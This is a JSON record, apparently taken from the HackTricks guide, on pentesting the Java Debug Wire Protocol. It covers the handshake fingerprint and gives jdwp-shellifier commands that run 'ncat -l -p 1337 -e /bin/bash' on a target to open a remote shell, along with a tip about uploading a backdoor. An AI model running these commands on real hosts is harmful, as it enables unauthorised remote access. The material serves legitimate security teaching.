{
  "id": "network_services_pentesting_91d01cad011e",
  "category": "network-services-pentesting",
  "title": "pentesting jdwp java debug wire protocol",
  "description": "# Pentesting JDWP - Java Debug Wire Protocol\n\n{{#include ../banners/hacktricks-training.md}}\n\n\n## Exploiting\n\nJDWP exploitation hinges on the **protocol's lack of authentication and encryption**. It's generally found on **port 8000**, but other ports are possible. The initial connection is made by sending a \"JDWP-Handshake\" to the target port. If a JDWP service is active, it responds with the same string, confirming its presence. This handshake acts as a fingerprinting method to identify JDWP se",
  "payloads": [
    "# Pentesting JDWP - Java Debug Wire Protocol",
    "{{#include ../banners/hacktricks-training.md}}",
    "## Exploiting",
    "JDWP exploitation hinges on the **protocol's lack of authentication and encryption**. It's generally found on **port 8000**, but other ports are possible. The initial connection is made by sending a \"JDWP-Handshake\" to the target port. If a JDWP service is active, it responds with the same string, confirming its presence. This handshake acts as a fingerprinting method to identify JDWP services on the network.",
    "In terms of process identification, searching for the string \"jdwk\" in Java processes can indicate an active JDWP session.",
    "The go-to tool is [jdwp-shellifier](https://github.com/hugsy/jdwp-shellifier). You can use it with different parameters:",
    "```bash",
    "./jdwp-shellifier.py -t 192.168.2.9 -p 8000 #Obtain internal data",
    "./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --cmd 'ncat -l -p 1337 -e /bin/bash' #Exec something",
    "./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'ncat -l -p 1337 -e /bin/bash' #Uses java.lang.String.indexOf as breakpoint instead of java.net.ServerSocket.accept",
    "I found that the use of `--break-on 'java.lang.String.indexOf'` makes the exploit more **stable**. And if you have the chance to upload a backdoor to the host and execute it instead of executing a command, the exploit will be even more stable.",
    "## More details",
    "**This is a summary of [https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)**. Check it for further details.",
    "1. **JDWP Overview**:",
    "- It's a packet-based network binary protocol, primarily synchronous."
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol.md"
  ]
}